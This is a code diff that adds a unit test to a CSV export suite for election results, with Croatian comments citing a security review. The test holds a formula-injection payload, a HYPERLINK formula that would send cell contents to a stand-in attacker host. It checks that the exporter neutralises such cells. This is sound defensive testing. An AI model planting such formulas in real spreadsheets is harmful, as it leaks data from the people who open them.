@@ -54,6 +54,29 @@ describe("buildResultsCsv — format", () => {
     expect(csv).toContain(`Izbori${SEMI}"Izbori; ponovljeni"`);
   });
 
+  // Napad iz sigurnosnog pregleda 2026-08-02: naslov i ime kandidata piše
+  // administrator, a datoteku otvara revizor. Test dokazuje da izvoz stvarno
+  // prolazi kroz csvField(), a ne samo da csvField() zna zaštititi ćeliju.
+  it("neutralises a formula in an admin-controlled cell", () => {
+    const attack = '=HYPERLINK("https://evil.example/?d="&A1,"Rezultati")';
+    const csv = buildResultsCsv(
+      data({
+        title: "=1+1",
+        options: [{ id: "a", text: attack, description: "-Uloga", votes: 1 }],
+      }),
+      labels,
+      SEMI,
+    );
+    expect(row(csv, "Izbori")).toBe("Izbori;'=1+1");
+    expect(csv).toContain(`"'${attack.replace(/"/g, '""')}";'-Uloga`);
+    // Nijedna ćelija ne smije početi okidačem.
+    for (const line of lines(csv).slice(1)) {
+      for (const cell of line.split(SEMI)) {
+        expect(cell.replace(/^"/, "")).not.toMatch(/^[=+\-@\t\r]/);
+      }
+    }
+  });
+
   it("separates the header block from the candidate table with a blank line", () => {
     const csv = buildResultsCsv(data(), labels, SEMI);
     const all = lines(csv);
